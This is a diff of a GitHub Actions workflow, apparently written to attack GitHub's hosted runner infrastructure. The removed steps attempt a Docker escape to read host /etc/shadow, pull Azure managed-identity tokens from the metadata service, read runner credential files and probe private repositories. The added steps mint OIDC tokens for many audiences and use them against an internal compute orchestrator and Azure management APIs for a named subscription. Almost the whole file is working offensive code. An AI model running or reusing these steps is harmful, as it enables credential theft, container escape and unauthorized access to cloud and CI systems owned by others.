@@ -1,113 +1,109 @@
-name: Deep Infra Recon
+name: Orchestrator Access
 on:
   workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Internal services
+      - name: Get OIDC token and access orchestrator
         run: |
           set +e
 
-          echo "=== HOSTED COMPUTE ORCHESTRATOR ==="
-          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1 2>&1
-          echo ""
-          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/ 2>&1
-          echo ""
+          echo "=== OIDC TOKEN REQUEST ==="
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN length: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
 
-          echo "=== ALL AZURE IMDS ENDPOINTS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
+          # Get OIDC token for hosted-compute-ro audience
           echo ""
+          echo "=== OIDC TOKEN FOR ORCHESTRATOR ==="
+          OIDC_RESPONSE=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" 2>&1)
+          echo "OIDC Response: $OIDC_RESPONSE"
 
-          echo "=== AZURE MANAGED IDENTITY (all resources) ==="
-          for resource in "https://management.azure.com/" "https://vault.azure.net" "https://storage.azure.com/" "https://graph.microsoft.com/" "https://database.windows.net/" "https://dev.azuresynapse.net"; do
-            echo "--- Resource: $resource ---"
-            curl -s --connect-timeout 3 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resource" 2>&1
+          # Extract token
+          OIDC_TOKEN=$(echo "$OIDC_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "OIDC Token length: ${#OIDC_TOKEN}"
+
+          if [ ${#OIDC_TOKEN} -gt 10 ]; then
+            echo "GOT OIDC TOKEN!"
+
+            # Decode JWT payload
             echo ""
-          done
+            echo "=== JWT PAYLOAD ==="
+            echo "$OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
 
-          echo "=== AZURE WIRE SERVER DEEP ==="
-          for path in "/" "/machine" "/machine?comp=goalstate" "/machine?comp=config" "/machine/plugins" "/machine?comp=telemetrydata" "/healthcheck"; do
-            echo "--- $path ---"
-            curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" "http://168.63.129.16$path" 2>&1 | head -10
+            # Try orchestrator with OIDC token
             echo ""
+            echo "=== ORCHESTRATOR WITH OIDC TOKEN ==="
+            RO_URL=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>&1 | python3 -c "
+import sys,json
+tags=json.load(sys.stdin)
+for t in tags:
+    if t['name']=='hosted_compute.base_ro_url':
+        print(t['value'])
+        break
+" 2>/dev/null)
+            echo "RO_URL: $RO_URL"
+
+            if [ -n "$RO_URL" ]; then
+              # Try different endpoints
+              for path in "" "/" "/status" "/health" "/vm" "/vms" "/config" "/allocation"; do
+                echo "--- $RO_URL$path ---"
+                curl -sv --connect-timeout 5 -H "Authorization: Bearer $OIDC_TOKEN" "$RO_URL$path" 2>&1 | tail -20
+                echo ""
+              done
+
+              # Try POST
+              echo "=== POST to orchestrator ==="
+              curl -sv --connect-timeout 5 -X POST                 -H "Authorization: Bearer $OIDC_TOKEN"                 -H "Content-Type: application/json"                 -d '{"action":"status"}'                 "$RO_URL" 2>&1 | tail -15
+            fi
+          fi
+
+          # Try other OIDC audiences
+          echo ""
+          echo "=== OTHER OIDC AUDIENCES ==="
+          for audience in "api://hosted-compute-ro" "api://AzureADTokenExchange" "https://management.azure.com/" "https://vault.azure.net" "https://graph.microsoft.com/" "https://github.com" "api://actions-results" "api://pipelines"; do
+            echo "--- Audience: $audience ---"
+            RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"               "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$audience" 2>&1)
+            TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','')[:50])" 2>/dev/null)
+            if [ -n "$TOKEN" ] && [ "$TOKEN" != "None" ]; then
+              echo "  GOT TOKEN (${#TOKEN}+ chars): ${TOKEN}..."
+              # Decode audience from JWT
+              echo "$RESP" | python3 -c "
+import sys,json,base64
+resp=json.load(sys.stdin)
+token=resp.get('value','')
+parts=token.split('.')
+if len(parts)>=2:
+    payload=parts[1]+'=='
+    try:
+        decoded=json.loads(base64.urlsafe_b64decode(payload))
+        print('  aud:',decoded.get('aud'))
+        print('  iss:',decoded.get('iss'))
+        print('  sub:',decoded.get('sub','')[:100])
+    except: pass
+" 2>/dev/null
+            else
+              echo "  No token"
+            fi
           done
 
-          echo "=== DOCKER ESCAPE ATTEMPT ==="
-          echo "Docker socket:"
-          ls -la /var/run/docker.sock 2>&1
+          # Try to use OIDC token to access Azure resources
           echo ""
-
-          echo "Host /etc/shadow via docker mount:"
-          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -10
-          echo ""
-
-          echo "Host processes via docker:"
-          docker run --rm --pid=host alpine ps aux 2>&1 | head -30
-          echo ""
-
-          echo "Host network via docker:"
-          docker run --rm --net=host alpine sh -c "wget -qO- http://169.254.169.254/metadata/instance?api-version=2021-02-01 --header='Metadata:true' 2>&1 | head -50" 2>&1
-          echo ""
-
-          echo "=== GITHUB INTERNAL HOSTS ==="
-          for host in "github.com" "api.github.com" "githubapp.com" "github.net" "actions-results.githubusercontent.com" "pipelines.actions.githubusercontent.com" "vstoken.actions.githubusercontent.com" "token.actions.githubusercontent.com" "results-receiver.actions.githubusercontent.com" "codeload.github.com" "alive.github.com" "collector.github.com"; do
-            echo "--- $host ---"
-            dig +short $host 2>/dev/null | head -3
-          done
-
-          echo ""
-          echo "=== RESOLVE INTERNAL HOSTS ==="
-          for host in "hosted-compute-request-orchestrator-prod-iad-02.githubapp.com" "actions-results-prod.githubapp.com" "actions-cache-prod.githubapp.com" "runner-provisioner.githubapp.com" "codespace-provisioner.githubapp.com"; do
-            echo "--- $host ---"
-            dig +short $host 2>/dev/null | head -3
-            curl -s --connect-timeout 3 "https://$host/" 2>&1 | head -5
+          echo "=== USE OIDC FOR AZURE ==="
+          AZ_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://management.azure.com/" 2>&1 |             python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          if [ ${#AZ_TOKEN} -gt 10 ]; then
+            echo "Got Azure management token! Length: ${#AZ_TOKEN}"
+            # Try to list subscriptions
+            curl -s -H "Authorization: Bearer $AZ_TOKEN"               "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>&1 | head -20
             echo ""
-          done
-
-          echo "=== CURL INTERNAL GITHUB SERVICES ==="
-          for url in "https://actions-results.githubusercontent.com/" "https://pipelines.actions.githubusercontent.com/" "https://codeload.github.com/" "https://alive.github.com/" "https://collector.github.com/"; do
-            echo "--- $url ---"
-            curl -sv --connect-timeout 3 "$url" 2>&1 | head -15
-            echo ""
-          done
-
-          echo "=== GITHUB_TOKEN SCOPES ==="
-          curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user 2>&1 | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-ratelimit"
-          echo ""
-
-          echo "=== TRY ACCESS PRIVATE GITHUB REPOS ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/github 2>&1 | head -5
-          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/docs-internal 2>&1 | head -5
-          echo ""
-
-          echo "=== ENVIRONMENT FILES ==="
-          cat /home/runner/work/_temp/_runner_file_commands/*.txt 2>/dev/null
-          cat /home/runner/.credentials 2>/dev/null
-          cat /home/runner/.credentials_rsaparams 2>/dev/null
-          ls -la /home/runner/.credentials* 2>/dev/null
-          cat /home/runner/.runner 2>/dev/null
-          echo ""
-
-          echo "=== RUNNER CONFIG ==="
-          cat /home/runner/work/_temp/.runner 2>/dev/null || true
-          find /home/runner -name "*.json" -size +0 2>/dev/null | head -10
-          for f in $(find /home/runner -name "*.json" -size +0 2>/dev/null | head -5); do
-            echo "--- $f ---"
-            cat "$f" 2>/dev/null | head -10
-          done
+            # Try to list resources in known subscription
+            curl -s -H "Authorization: Bearer $AZ_TOKEN"               "https://management.azure.com/subscriptions/52c39132-e955-4170-bbad-8df28fb02dfc/resources?api-version=2021-04-01" 2>&1 | head -20
+          fi
 
           echo ""
-          echo "=== NETWORK CONNECTIONS ==="
-          ss -tnp 2>&1 | head -20
-          echo ""
-
-          echo "=== FULL /etc/hosts ==="
-          cat /etc/hosts
-          echo ""
-
-          echo "=== IPTABLES ==="
-          sudo iptables -L -n 2>&1 | head -20
-          echo ""
-
           echo "=== DONE ==="
